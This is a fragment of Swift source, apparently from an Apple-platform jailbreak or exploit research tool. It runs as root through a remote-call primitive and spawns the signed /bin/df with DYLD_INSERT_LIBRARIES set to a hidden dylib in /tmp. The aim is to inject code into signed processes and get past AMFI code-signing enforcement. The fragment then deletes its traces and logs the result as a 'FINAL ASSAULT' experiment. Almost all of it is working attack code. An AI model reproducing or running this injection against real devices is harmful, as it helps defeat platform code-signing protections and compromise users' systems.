            RootExecutor.rcall(rc, "write", fakeFd, hdrAddr, 32)
            RootExecutor.rcall(rc, "close", fakeFd)
        }
        
        // Spawn /bin/df (SIGNED) with DYLD_INSERT_LIBRARIES pointing to our dylib
        let envBase = mem + 0x2800
        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/tmp/.dsp_inject.dylib")
        let pathEnv = remote_alloc_str(rc, "PATH=/bin:/usr/bin:/sbin")
        rc[envBase].setValue64(dyldEnv)
        rc[envBase + 8].setValue64(pathEnv)
        rc[envBase + 16].setValue64(0)
        
        let signedBin = remote_alloc_str(rc, "/bin/df")
        let argvBase3 = mem + 0x1C00
        rc[argvBase3].setValue64(signedBin)
        rc[argvBase3 + 8].setValue64(0)
        let pidAddr3 = mem + 0x1E00
        rc[pidAddr3].setValue64(0)
        
        let dyldRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr3, signedBin, 0, 0, argvBase3, envBase)
        let dyldPid = rc[pidAddr3].value32()
        RootExecutor.rcall(rc, "usleep", 500000)
        let dyldWait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        detail += "Spawn /bin/df + DYLD_INSERT: ret=\(dyldRet), pid=\(dyldPid), wait=\(dyldWait)\n"
        
        if dyldRet == 0 {
            detail += "Spawn succeeded — check if dylib was loaded (need output capture)\n"
            // If DYLD_INSERT works → we can inject code into ANY signed process!
        }
        
        RootExecutor.rcall(rc, "free", dyldEnv)
        RootExecutor.rcall(rc, "free", pathEnv)
        RootExecutor.rcall(rc, "free", signedBin)
        RootExecutor.rcall(rc, "free", fakeAddr)
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "unlink", remote_alloc_str(rc, fakeDylib))
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        // ═══════════════════════════════════════════════
        // SUMMARY
        // ═══════════════════════════════════════════════
        detail += "\n═══ SUMMARY ═══\n"
        detail += "Paths tested: 5\n"
        detail += anySuccess ? "🔥 Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
        
        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
    }
    
    #endif
}
